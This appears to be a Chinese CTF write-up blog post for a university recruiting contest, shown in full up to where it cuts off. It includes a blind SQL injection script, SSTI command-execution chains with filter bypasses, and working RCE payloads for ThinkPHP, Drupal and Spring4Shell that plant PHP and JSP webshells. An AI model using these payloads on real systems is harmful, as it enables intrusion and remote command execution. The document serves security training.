href="#只需要修改url-和-两个payload即可" class="headerlink" title="只需要修改url 和 两个payload即可"></a>只需要修改url 和 两个payload即可</h1><h1 id="目标网址（不带参数）"><a href="#目标网址（不带参数）" class="headerlink" title="目标网址（不带参数）"></a>目标网址（不带参数）</h1><p>url &#x3D; “<a href="http://43.142.109.233:20003/">http://43.142.109.233:20003/</a>“</p><h1 id="猜解长度使用的payload"><a href="#猜解长度使用的payload" class="headerlink" title="猜解长度使用的payload"></a>猜解长度使用的payload</h1><p>payload_len &#x3D; “””?id&#x3D;1 and length(<br>                    (database())<br>                ) &lt; {n} “””</p><h1 id="枚举字符使用的payload"><a href="#枚举字符使用的payload" class="headerlink" title="枚举字符使用的payload"></a>枚举字符使用的payload</h1><p>payload_str &#x3D; “””?id&#x3D;1 and ascii(<br>                    substr(<br>                       (database())<br>                    ,{n},1)<br>                ) &#x3D; {r} “””</p><h1 id="获取长度"><a href="#获取长度" class="headerlink" title="获取长度"></a>获取长度</h1><p>def getLength(url, payload):<br>    length &#x3D; 1  # 初始测试长度为1<br>    while True:<br>        response &#x3D; requests.get(url&#x3D; url+payload_len.format(n&#x3D; length))</p><p>        # 页面中出现此内容则表示成功</p><p>        if ‘OK’ in response.text:<br>            print(‘测试长度完成，长度为：’, length,)<br>            return length;<br>        else:<br>            print(‘正在测试长度：’,length)<br>            length +&#x3D; 1  # 测试长度递增</p><h1 id="获取字符"><a href="#获取字符" class="headerlink" title="获取字符"></a>获取字符</h1><p>def getStr(url, payload, length):<br>    str &#x3D; ‘’  # 初始表名&#x2F;库名为空</p><p>    # 第一层循环，截取每一个字符</p><p>    for l in range(1, length+1):</p><p>        # 第二层循环，枚举截取字符的每一种可能性</p><p>        for n in range(33, 126):<br>            response &#x3D; requests.get(url&#x3D; url+payload_str.format(n&#x3D; l, r&#x3D; n))</p><p>            # 页面中出现此内容则表示成功</p><p>            if ‘OK’ in response.text:<br>                str+&#x3D; chr(n)<br>                print(‘第’, l, ‘个字符猜解成功：’, str)<br>                break;<br>    return str;</p><h1 id="开始猜解"><a href="#开始猜解" class="headerlink" title="开始猜解"></a>开始猜解</h1><p>length &#x3D; getLength(url, payload_len)<br>getStr(url, payload_str, length)</p><p>每次要改的地方只有标红的区域</p><ol><li></li></ol><p>database()</p><p>爆出来表名为security</p><ol start="2"><li></li></ol><p>这里先手动对当前数据库爆表的数量，很方便</p><p><a href="http://43.142.109.233:20003/?id=1">http://43.142.109.233:20003/?id=1</a><br>and (select COUNT(*) from information_schema.tables where<br>table_schema&#x3D;database())&#x3D;5</p><p>爆出来是5</p><ol start="3"><li></li></ol><p>select<br>table_name from information_schema.tables where table_schema &#x3D; database() limit<br>0,1</p><p>select<br>table_name from information_schema.tables where table_schema &#x3D; database() limit<br>0,1</p><p>第一个表</p><p>referers</p><p>select<br>table_name from information_schema.tables where table_schema &#x3D; database() limit 1,1</p><p>select<br>table_name from information_schema.tables where table_schema &#x3D; database() limit 1,1</p><p>只改limit后面的数就完事</p><p>第二个表</p><p>emails</p><p>以此推类</p><p>第三个表users</p><p>第四个表flag</p><p>第五个表 就不查了</p><p>4.手动爆一些users的列数量</p><p><a href="http://43.142.109.233:20003/?id=1">http://43.142.109.233:20003/?id=1</a><br>and (select COUNT(*) from information_schema.columns where<br>table_schema&#x3D;database() and table_name&#x3D;”users”)&#x3D;3</p><p>爆出来是3</p><p>注意这里要用双引号，我也不知道为啥。。</p><ol start="5"><li></li></ol><p>select<br>column_name from information_schema.columns where table_schema &#x3D; database() and<br>table_name &#x3D;”users” limit 0,1</p><p>select<br>column_name from information_schema.columns where table_schema &#x3D; database() and<br>table_name&#x3D;”users” limit 0,1</p><p>select<br>column_name from information_schema.columns where table_schema &#x3D; database() and<br>table_name&#x3D;”users” limit 0,1</p><p>测出uers第一列:id</p><p>测出uers第三列:</p><p>测出uers第三列:password</p><p>不测了，才发现前面搞错了 flag已经整出来了</p><p>那就重复这些步骤找flag的列</p><p>测出flag第二列flag</p><ol start="6"><li></li></ol><p>select<br>flag from flag limit 0,1</p><p>终于爆出来了</p><p>可能是我脚本的问题，速度是龟速，靠脚本还是花了好久时间，不过只是为了解出题那瞬间的多巴胺分泌带来的快感，也是值得的</p><p>找朋友要了个更快的自动化脚本</p><ol start="4"><li></li></ol><p>还是整形闭合</p><p>在朋友脚本的基础上改了一下做出来了</p><p>不过精确度不高</p><p>延时盲注的一些语句：</p><p>“1<br>and if((select count(table_name) from<br>information_schema.tables where table_schema &#x3D; ‘database()’) &#x3D; 1,sleep(2),1)</p><p>主要是运用if三元式和sleep的原理</p><p>YulinSec{0kfjtXaE8VJxXFG9BjZSy0Yn6dVLLMwbQ3OiaI20}</p><ol start="5"><li></li></ol><p>还不会</p><p>Babyurl</p><p>考察ssrf</p><p>urls&#x3D;<a href="http://127.0.0.1/flag.php">http://0x7F.0.0.1/flag.php</a></p><p><code>SSTI</code></p><p><code>1.</code></p><p><code>1.&#123;&#123;''.__class__&#125;&#125;   # 获得单引号的类型</code></p><p><code>2.&#123;&#123;''.__class__.__base__&#125;&#125; #获得object</code></p><p><code>3.&#123;&#123;''.__class__.__base__.__subclasses__()&#125;&#125;#获得基类</code></p><p><code>这里要写个脚本得到os._wrap_close的键值</code></p><p><code>4.&#123;&#123;''.__class__.__base__.__subclasses__()[127]&#125;&#125;#这里我们利用的是&lt;class</code><br><code>&#39;os._wrap_close&#39;&gt;类</code></p><p><code>5.&#123;&#123;''.__class__.__base__.__subclasses__()[127].__init__.__globals__&#125;&#125;#将该类实例化并且全局搜索查找所有的方法、变量和参数</code></p><p><code>6.&#123;&#123;''.__class__.__base__.__subclasses__()[127].__init__.__globals__['popen']('ls').read()&#125;&#125;#利用popen函数执行命令</code></p><p><code>7.&#123;&#123;''.__class__.__base__.__subclasses__()[127].__init__.__globals__['popen']('catflag').read()&#125;&#125;#最后获得flag</code></p><p><code>不是直接cat，但差不多吧</code></p><p><code>2.</code></p><p><code>过滤&#123;&#123;``用&#123;%print(来代替``比如``&#123;%print(''.__class__)%&#125;``然后按第一题思路就行``&#123;%print(''.__class__.__base__.__subclasses__()[127]) .__init__.__globals__['popen']('cat/flag').read()%&#125;``3.``过滤[]，用getitem``&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(127).__init__.__globals__.__getitem__('popen')('ls').read()&#125;&#125;</code></p><p><code>&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(127).__init__.__globals__.__getitem__('popen')('cat``/flag').read()&#125;&#125;</code></p><p><code>4.</code></p><p><code>过滤下划线</code></p><p><code>用16进制编码绕过</code></p><p><code>&#123;&#123;()['\x5f\x5fclass\x5f\x5f']['\x5f\x5fbase\x5f\x5f']['\x5f\x5fsubclasses\x5f\x5f']()[127]['\x5f\x5finit\x5f\x5f']['\x5f\x5fglobals\x5f\x5f']['popen']('cat``/flag').read() &#125;&#125;</code></p><p><code>5.</code></p><p><code>过滤单双引号</code></p><p><code>&#123;&#123;[].__class__.__mro__[1].__subclasses__()[127].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;   同时get传参?a=popen&amp;b=cat /flag</code></p><p><code>6．</code></p><p><code>过滤小数点</code></p><p><code>&#123;&#123;()['__class__']['__base__']['__subclasses__']()[127]['__init__']['__globals__']['popen']('cat``/flag')['read']()&#125;&#125;</code></p><p><code>7.</code></p><p><code>过滤了一堆关键字</code></p><p><code>&#123;&#123;()['__cla'+'ss__']['__ba'+'se__']['__subcl'+'asses__']()[127]['__in'+'it__']['__glo'+'bals__']['pop'+'en']('c'+'at``/fl'+'ag')['re'+'ad']()&#125;&#125;</code></p><p><code>#</code> </p><h1 id="part2"><a href="#part2" class="headerlink" title="part2:"></a>part2:</h1><h1 id="YuLin-2023-Recruit-Writeup-part-2"><a href="#YuLin-2023-Recruit-Writeup-part-2" class="headerlink" title="YuLin 2023 Recruit Writeup part 2"></a>YuLin 2023 Recruit Writeup part 2</h1><p>word太难用了，于是part2都用md来写</p><h2 id="Easy-盒武器"><a href="#Easy-盒武器" class="headerlink" title="[Easy]盒武器"></a>[Easy]盒武器</h2><h3 id="picture1"><a href="#picture1" class="headerlink" title="picture1"></a>picture1</h3><p>识图出来：武汉理工大学南湖校区心至楼</p><h3 id="picture2"><a href="#picture2" class="headerlink" title="picture2"></a>picture2</h3><p>在地图附件找武汉长江大桥的公园</p><p>试出来：湖北省武汉市汉阳区龟山北路5号龟山风景区</p><p>看出题人空间找到10.4到10.5的武汉游玩信息</p><p>穷举试出来：2023年10月05日18时</p><h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) == <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;flag1: &#x27;</span>.<span class="variable">$flag1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;a is not equal to b&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;Yu&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;lin&#x27;</span>] &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Yu&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;lin&#x27;</span>]))) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Yu&#x27;</span>]);</span><br><span class="line">    <span class="comment">//cat /flag2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二个flag考察fastcoll，用fastcoll生成两个md5相同的字符串，由于有不可见字符，要url编码之后get传参</p><p>注意这里根据题目要求，生成文件要用system(‘cat &#x2F;flag2’);#</p><p>#用于截断，eval只执行system(‘cat &#x2F;flag2’);</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readmyfile</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$fh</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"> <span class="variable">$data</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fh</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$path</span>));</span><br><span class="line"> <span class="title function_ invoke__">fclose</span>(<span class="variable">$fh</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;G:\php\app\php-7.4.5-Win32-vc15-x64\a_msg1.txt&quot;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;G:\php\app\php-7.4.5-Win32-vc15-x64\a_msg2.txt&quot;</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>))===<span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)!=<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;b:&quot;</span>;    </span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a url 编码的MD5:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a url 编码的MD5:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;复制a url 的MD5&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&quot;leon%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1FU%F8%24%DA%25Q%F8j%FE%21%F9u%3D9%88%08%11%BC9s%97%CC%E1%18%C2%80E%B0%1D%0Cw%A1%EB%FE%BD%CC%CE%1A%8C%0B%C8%F7%02%E3%F1%09o%84%A8%E6n%E0%1F%8E%7B%17l%01W%DF%FD%40eu%D9%E6f%12%AA%98Z%7F%9A%C1%2A%D9i%CB%0CE%F2X%18%8A%CD%FE%1C+%29%AF%07J%7C%F1%BD%8D_%7Bd%D4%DA%B0%87%22%1D%05%D2%99L%05%3F%CA%84%10%B1%B6%D6%C3qr%29%12m%ED%C4%D0%FB&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;复制b url 的MD5&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&quot;leon%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1FU%F8%24%DA%25Q%F8j%FE%21%F9u%3D9%88%08%11%BC%B9s%97%CC%E1%18%C2%80E%B0%1D%0Cw%A1%EB%FE%BD%CC%CE%1A%8C%0B%C8%F7%02%E3q%0Ao%84%A8%E6n%E0%1F%8E%7B%17l%01%D7%DF%FD%40eu%D9%E6f%12%AA%98Z%7F%9A%C1%2A%D9i%CB%0CE%F2X%98%8A%CD%FE%1C+%29%AF%07J%7C%F1%BD%8D_%7Bd%D4%DA%B0%87%22%1D%05%D2%99%CC%04%3F%CA%84%10%B1%B6%D6%C3qr%29%12%ED%ED%C4%D0%FB&quot;</span>);</span><br><span class="line"><span class="variable">$code</span>=<span class="string">&quot;echo 1234 ;#efsdghfgj&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$code</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://43.142.109.233:2003/?Yu=system%28%27cat+%2Fflag2%27%29%3B%23%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00f%AB%0F%AE%F7%7C%8DQ8%AA%84%A7Z%06%AD%E8%91F%DE%8DL%D5AUE%B27A%8C%06%89w%3D%BB%AD%CF%F2%28Mp%8F%F0%D5%1C%A0%C9%EAZd%DA%F7%7D%8C%05%ED4%9B%ECXE%88%2F%9F%C5%BA%E8%BAX%2F.%DD%B9%BDJ%B3%7C%96G%3C%3B%A7A%C1x8%9B1%B2%AB%C30%B8%A6_%88%A8%D7%BD%EA%E7%9F%043%FE5%40%0C4Q%F8%F9%C3%B2%EFwp%8AQv%3D%C7aq%BFV%F5%86X&amp;lin=system%28%27cat+%2Fflag2%27%29%3B%23%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00f%AB%0F%AE%F7%7C%8DQ8%AA%84%A7Z%06%AD%E8%91F%DE%0DL%D5AUE%B27A%8C%06%89w%3D%BB%AD%CF%F2%28Mp%8F%F0%D5%1C%A0I%EBZd%DA%F7%7D%8C%05%ED4%9B%ECX%C5%88%2F%9F%C5%BA%E8%BAX%2F.%DD%B9%BDJ%B3%7C%96G%3C%3B%A7A%C1%F88%9B1%B2%AB%C30%B8%A6_%88%A8%D7%BD%EA%E7%9F%043%FE5%40%0C4Qx%F9%C3%B2%EFwp%8AQv%3D%C7aq%3FV%F5%86X</span><br></pre></td></tr></table></figure><h2 id="EASY-Script-Kiddie"><a href="#EASY-Script-Kiddie" class="headerlink" title="[EASY]Script Kiddie"></a>[EASY]Script Kiddie</h2><p>既然当脚本小子我就只求结果了（</p><h3 id="thinkphp-5-0"><a href="#thinkphp-5-0" class="headerlink" title="thinkphp 5.0"></a>thinkphp 5.0</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><h3 id="drupal"><a href="#drupal" class="headerlink" title="drupal"></a>drupal</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>121.5.35.176:30003</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>173</span><br><span class="line"></span><br><span class="line"><span class="language-prolog">form_id=user_register_form&amp;<span class="symbol">_drupal_ajax</span>=<span class="number">1</span>&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=echo <span class="string">&quot;PD9waHAgZXZhbCgkX1JFUVVFU1RbOF0pIDs/Pg==&quot;</span> |base64 -d |tee test.php</span></span><br></pre></td></tr></table></figure><p>配合使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.5.35.176:30003/test.php?8=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure><h3 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&quot;suffix&quot;</span>: <span class="string">&quot;%&gt;//&quot;</span>,</span><br><span class="line">    <span class="string">&quot;c1&quot;</span>: <span class="string">&quot;Runtime&quot;</span>,</span><br><span class="line">    <span class="string">&quot;c2&quot;</span>: <span class="string">&quot;&lt;%&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%&#123;c2&#125;i if(&quot;fuck&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = %&#123;c1&#125;i.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; %&#123;suffix&#125;i&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=fuck&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&#x27;</span></span><br><span class="line">ip=<span class="string">&quot;http://121.5.35.176:30004/&quot;</span></span><br><span class="line">payload2=<span class="string">&#x27;/fuck.jsp?pwd=fuck&amp;cmd=id&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    U1=requests.get(url=ip+payload1,headers=headers,verify=<span class="literal">False</span>,timeout=<span class="number">3</span>)</span><br><span class="line">    U2=requests.get(url=ip+payload2,verify=<span class="literal">False</span>,timeout=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> U2.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;The VULN CVE-2022-22965 exists, payload</span></span><br></pre></td></tr></table></figure><p>配合</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.5.35.176:30004/fuck.jsp?pwd=fuck&amp;cmd=cat /flag</span><br></pre></td></tr></table></figure><h3 id="绝对音感"><a href="#绝对音感" class="headerlink" title="绝对音感"></a>绝对音感</h3><p>wav拖到010editor里，最后一段发现提示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The interval of each byte data is <span class="number">9</span> <span class="keyword">and</span> the first byte is at the beginning of the wav data</span><br></pre></td></tr></table></figure><p>c写了个脚本跑出来邮件：</p><p>Dear Friend ; Especially for you - this red-hot announcement<br>! We will comply with all removal requests ! This mail<br>is being sent in compliance with Senate bill 2116 ;<br>Title 1 ; Section 303 ! This is NOT unsolicited bulk<br>mail ! Why work for somebody else when you can become<br>rich within 81 months . Have you ever noticed nearly<br>every commercial on television has a .com on in it<br>and nearly every commercial on television has a .com<br>on in it . Well, now is your chance to capitalize on<br>this ! We will help you deliver goods right to the<br>customer’s doorstep and use credit cards on your website<br>! You can begin at absolutely no cost to you . But<br>don’t believe us . Ms Ames who resides in New Jersey<br>tried us and says “Now I’m rich many more things are<br>possible” ! This offer is 100% legal . So make yourself<br>rich now by ordering immediately ! Sign up a friend<br>and you get half off . Thanks ! Dear Salaryman ; Especially<br>for you - this amazing intelligence ! If you are not<br>interested in our publications and wish to be removed<br>from our lists, simply do NOT respond and ignore this<br>mail . This mail is being sent in compliance with Senate<br>bill 2716 , Title 3 , Section 303 ! This is different<br>than anything else you’ve seen . Why work for somebody<br>else when you can become rich within 87 days . Have<br>you ever noticed most everyone has a cellphone and<br>society seems to be moving faster and faster . Well,<br>now is your chance to capitalize on this ! WE will<br>help YOU use credit cards on your website &amp; turn your<br>business into an E-BUSINESS . You can begin at absolutely<br>no cost to you ! But don’t believe us ! Mr Ames of<br>Colorado tried us and says “I’ve been poor and I’ve<br>been rich - rich is better” ! We are licensed to operate<br>in all states . Do not delay - order today ! Sign up<br>a friend and you’ll get a discount of 50% . Thank-you<br>for your serious consideration of our offer .</p><p>然后根据提示可以把垃圾邮件给解密</p><p>用这个网站</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.spammimic.com/decode.cgi</span><br></pre></td></tr></table></figure><h3 id="【Mid】MidBypass"><a href="#【Mid】MidBypass" class="headerlink" title="【Mid】MidBypass"></a>【Mid】MidBypass</h3><p>提示说了有disable_function,给了一个后门</p><p>蚁剑一下，第一个flag直接送了，其他路径看不了</p><p>还有一个open basedir</p><p>phpinfo先看看</p><hr><p>搜了好多关于imagematrick的文件上传漏洞，但是现在还没搞懂写入的png怎么执行命令🥲</p><p>蚁剑插件作弊过了，以后有机会要复现一下</p><h2 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h2><p>先部署靶场，我直接放在本地127.0.0.1了</p><h3 id="解锁皮卡丘的密码"><a href="#解锁皮卡丘的密码" class="headerlink" title="解锁皮卡丘的密码"></a>解锁皮卡丘的密码</h3><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><h4 id="1-基于表单暴力破解"><a href="#1-基于表单暴力破解" class="headerlink" title="1.基于表单暴力破解"></a>1.基于表单暴力破解</h4><p>火狐改下设置抓本地包</p><p>burp抓包爆破，爆出来密码123456</p><h4 id="2-基于前端的验证码绕过（on-server）"><a href="#2-基于前端的验证码绕过（on-server）" class="headerlink" title="2. 基于前端的验证码绕过（on server）"></a>2. 基于前端的验证码绕过（on server）</h4><p>随便试了下密码怎么还是123456……..</p><p>先burp抓包，然后发现一次抓包中验证码不用改</p><p>就和1一样了</p><h4 id="3-基于前端的验证码绕过（on-client）"><a href="#3-基于前端的验证码绕过（on-client）" class="headerlink" title="3.基于前端的验证码绕过（on client）"></a>3.基于前端的验证码绕过（on client）</h4><p>试了一下验证码是前端的，那么抓包直接去掉，和1一样</p><p>密码测出来还是123456</p><h4 id="4-token防暴破"><a href="#4-token防暴破" class="headerlink" title="4.token防暴破"></a>4.token防暴破</h4><p>初见还真没思路，搜索了一下</p><p>抓包pitchfork爆破密码和token</p><p>如图在extract选中token</p><p><img src="https://bu.dusays.com/2023/11/03/65450f2ca0453.png"></p><p>如图填入第一个token,并选择递归搜索</p><p><img src="https://bu.dusays.com/2023/11/03/65450f2d84a29.png"></p><p>成功，密码当然还是12345</p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="1-反射型xss-get"><a href="#1-反射型xss-get" class="headerlink" title="1.反射型xss(get)"></a>1.反射型xss(get)</h4><p>试了一堆球星，只认识科比，有点难绷。</p><p>试了下限制长度，f12改掉就行，再输入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>成功弹窗</p><h4 id="2-反射性xss-post"><a href="#2-反射性xss-post" class="headerlink" title="2.反射性xss(post)"></a>2.反射性xss(post)</h4><p>出bug了，我这题出现了登录框</p><p>搜索这题本来的样子，然后脑过吧</p><p>改成post就是post传参</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span 